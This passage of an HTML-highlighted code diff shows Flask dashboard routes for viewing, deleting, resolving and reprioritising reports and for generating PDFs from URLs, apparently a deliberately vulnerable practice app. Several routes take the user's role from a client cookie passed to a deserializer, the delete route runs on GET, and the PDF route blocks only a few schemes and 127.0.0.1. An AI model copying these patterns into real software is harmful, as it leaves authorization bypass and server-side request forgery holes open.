+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;webdev&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_report_by_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard/report.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# If not authorized, do nothing (or handle unauthorized access)
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard.dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@dashboard_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/delete/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;del_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Delete a report if the user is authorized and redirect to dashboard.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;deserialize_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;webdev&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;delete_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard.dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# If not authorized, do nothing (or handle unauthorized access)
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard.dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@dashboard_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/resolve&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Resolve a report and provide feedback to the user.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;resolve_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Report resolved successfully!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Error occurred while trying to resolve!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard.dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@dashboard_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/change_priority&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@admin_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;change_priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Change the priority of a report if the user is an admin.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;deserialize_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Not enough permissions. Only admins can change report priority.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard.dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;priority_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;priority_level&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;change_report_priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priority_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Report priority level changed!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Error occurred while trying to change the priority!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard.dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@dashboard_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/create_pdf_report&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@admin_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_pdf_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Create a PDF report from a URL and provide it for download.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;report_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report_url&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;scheme&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheme&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netloc&lt;/span&gt;
+
+            &lt;span class=&quot;n&quot;&gt;disallowed_schemas&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ftps&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheme&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disallowed_schemas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allowed_hostnames&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
